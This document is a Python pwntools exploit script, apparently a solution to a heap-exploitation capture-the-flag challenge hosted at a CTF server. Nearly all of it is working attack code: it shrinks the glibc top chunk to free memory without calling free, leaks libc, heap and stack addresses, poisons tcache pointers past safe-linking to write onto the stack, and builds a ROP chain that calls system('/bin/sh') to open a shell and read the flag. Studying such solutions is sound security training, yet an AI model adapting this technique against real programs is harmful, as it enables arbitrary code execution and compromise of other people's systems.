#!/usr/bin/env python3
from pwn import *


context.binary = elf = ELF('../challenge/out_patched')
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('../challenge/libc.so.6')



def conn():
    if args.REMOTE:
        return remote('orange.ctf.ingeniums.club', 1337, ssl=True)
    else:
        return process(elf.path)
    

r = conn()


def alloc(idx, size):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'index: ', str(idx).encode())
    r.sendlineafter(b'size: ', str(size).encode())

    return idx


def edit(idx, offset, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'index: ', str(idx).encode())
    r.sendlineafter(b'offset: ', str(offset).encode())
    r.sendafter(b'data: ', data)

    return idx


def show(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'index: ', str(idx).encode())

    


a = alloc(0, 0xc70 - 8)
new_top_size = 0x101
edit(a, 0xc70 - 8 - 1, b'q' + p64(new_top_size))


# overlap top chunk
alloc(1, 0x200 - 8)


b = alloc(2, 0xd00 - 8)
edit(b, 0xd00 - 8 - 1, b'q' + p64(new_top_size))

# overlap new top chunk
alloc(3, 0x200 - 0x8)


c = alloc(4, 0x200 - 8)
new_top_size = 0xc01
edit(c,  0x200 - 8 - 1, b'q' + p64(new_top_size))

alloc(5, 0x1000)



# get libc leak
d = alloc(6, 0x200)
edit(d, 0, b'A')
show(d)

r.recvuntil(b'data: ')
out = r.recv(6)
out = u64(out + b'\x00\x00')
log.info(f'libc leak: {hex(out)}')


libc.address = out - 0X1e8141
log.info(f'libc base: {hex(libc.address)}')


# get heap leak
edit(d, 0, b'A' * 0x11)
show(d)


r.recvuntil(b'data: ' + b'A' * 0x10)
out = r.recv(6)
out = u64(out + b'\x00\x00')
log.info(f'heap leak: {hex(out)}')
heap_base = out - 0x43441
log.info(f'heap base: {hex(heap_base)}')
environ = libc.sym['environ']
log.info(f'environ: {hex(environ)}')



edit(b, 0xd00 - 8 - 1, b'q' + p64(0xe1) + p64(((environ - 0x18) ^ ((heap_base + 0x21000) >> 12))))

# leak stack
alloc(7, 0xe0 - 8)
stack = alloc(8, 0xe0 - 8)
edit(stack, 0, b'A' * 0x18)
show(stack)

r.recvuntil(b'data: ' + b'A' * 0x18)
out = r.recv(6)
out = u64(out + b'\x00\x00')
log.info(f'stack leak: {hex(out)}')
saved_rbp = out - 0x138
log.info(f'saved rbp: {hex(saved_rbp)}')




# 0x43000 + 0x610 + 0xa00 + 0x22000
c1 = alloc(1, 0xdf0 - 8)
new_top_size = 0x201
edit(c1, 0xdf0 - 8 - 1, b'q' + p64(new_top_size))

# overlap top chunk
alloc(2, 0x1000 - 8)


# 0x21000 + 0x44000 + 0x22000 + 0x1000
c2 = alloc(3, 0xe00 - 8)
edit(c2, 0xe00 - 8 - 1, b'q' + p64(new_top_size))

# overlap top chunk
alloc(4, 0x1000 - 8)


key = heap_base + 0x88e10
edit(c2, 0xe00 - 8 - 1, b'q' + p64(0x1e1) + p64(((saved_rbp) ^ ((key) >> 12))))





# rop your way to victory
alloc(1, 0x1e0 - 8)
rpb = alloc(2, 0x1e0 - 8)

rop = ROP([libc, elf])
ret = rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]


pay = b'A' * 0x8 
pay += p64(pop_rdi)
pay += p64(binsh)
pay += p64(ret)
pay += p64(libc.sym['system'])

edit(rpb, 0, pay)


# exit
r.sendlineafter(b'> ', b'5')
r.sendline(b"cat flag.txt")

# gdb.attach(r)


r.interactive()